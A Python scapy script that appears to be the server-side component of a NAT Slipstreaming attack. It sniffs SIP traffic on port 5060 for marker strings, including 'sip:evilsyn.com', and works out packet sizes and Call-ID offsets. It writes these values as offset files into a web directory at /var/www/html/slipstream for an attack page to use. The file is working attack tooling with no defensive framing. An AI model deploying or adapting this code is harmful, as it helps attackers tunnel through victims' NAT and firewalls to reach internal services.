from os import system
import re
from scapy.all import *

print("Make sure you changed the MTU size and verify with tcpdump")

# create a class of colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# DEV = input("Enter the interface: ")
MTU = 1514
DEV = "wlan0"
PAD = b"^_"
SCAN = b"SAMY_MAXPKTSIZE"
BEGIN = b"BEGIN_" + SCAN
END = b"END_" + SCAN
SIPURL = b"sip:evilsyn.com;transport"

FILTER = "tcp port 5060"

LENGTH = {}

# create a function to write contents into a file and change permissions
def wf(file, data):
    print(f"going to write into \n {file}\n{data}\n\n")
    with open(file, 'w') as f:
        f.write(data)
    system(f"chown www-data {file}")

# create a function to replace hex of regex ([^\w ]) matching characters with the hex equivalent of the character
def replace_hex(data):
    data = data.decode()
    # regex to match characters that are not alphanumeric or underscore
    regex = re.compile(r'[^\w ]')
    # replace the regex with the hex equivalent
    data = regex.sub(lambda x: '\\x' + ''.join(hex(ord(c))[2:].zfill(2) for c in x.group()), data)
    return data.encode()


def handle_packet(pkt):
    # check if the packet is UDP
    if pkt.haslayer(UDP):
        # implement UDP checks later
        print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} UDP Packet")

    # check if the packet is TCP
    elif pkt.haslayer(TCP):
        # get the source and destination IPs
        src = pkt[IP].src
        dst = pkt[IP].dst
        # get the source and destination ports
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport

        # get the payload
        if(pkt[TCP].haslayer(Raw)):
            payload = pkt[TCP].load
            length = len(payload)
        else:
            return None

        print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} Sniffed a TCP Packet with payload")
        print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} Source IP: {src}")
        print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} Destination IP: {dst}")
        print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} Source Port: {sport}")
        print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} Destination Port: {dport}")
        print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} Payload: {payload}")
        print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} Length: {length}")
        print("-"*50)


        ind = payload.find(BEGIN)
        if(ind >= 0):
            print(ind)
            print(payload[:ind])
            ind += len(BEGIN)

            padint = payload[ind:].find(PAD)
            if(padint >= 0):
                LENGTH['id'] = payload[ind+1:ind+padint].decode()
                print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} ID: {LENGTH['id']}")
                print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} Length: {LENGTH}")
                LENGTH['stuff_bytes'] = len(pkt) - ind

                if(len(pkt) > MTU):
                    print(f"{bcolors.WARNING}[!]{bcolors.ENDC} Packet is bigger than MTU")
                    print(f"{bcolors.WARNING}[!]{bcolors.ENDC} Packet Length: {len(pkt)}")
                    print(f"{bcolors.WARNING}[!]{bcolors.ENDC} MTU: {MTU}")
                    print(f"{bcolors.WARNING}[!]{bcolors.ENDC} Packet Length: {len(pkt)}")
                    print(f"{bcolors.WARNING}[!]{bcolors.ENDC} MTU: {MTU}")
                    print("-"*50)
                    LENGTH['orig_stuff_bytes'] = LENGTH['stuff_bytes']
                    LENGTH['orig_packet'] = len(pkt)
                    LENGTH['stuff_bytes'] = MTU - LENGTH['stuff_bytes']
        else:
            ind = payload.find(SIPURL)
            if(ind >= 0):
                offset = ind - len("REGISTER ")
                _ = payload.find(b"Call-ID: a", offset)
                __ = _+payload.find(b"b", _)
                LENGTH['id'] = re.findall(r'a*\d+', payload[_:payload.find(b"b", _)].decode())[0].replace('a','')
                print(f"{bcolors.OKBLUE}[+]{bcolors.ENDC} Call-ID: {LENGTH['id']}")

                dh = replace_hex(payload).decode()

                _file = f"/var/www/html/slipstream/sizes/samy.regoff.{LENGTH['id']}"
                origoffset = offset

                wf(_file, f"offset({offset}, '{dh}', {origoffset});")

        ind = payload.find(END)
        if(ind >= 0):
            if(type(LENGTH['stuff_bytes']) == int):
                LENGTH['stuff_bytes'] = str(LENGTH['stuff_bytes'])
            wf(f"/var/www/html/slipstream/sizes/samy.pktsize.{LENGTH['id']}", repr(LENGTH))

sniff(iface=DEV, filter=FILTER, prn=handle_packet)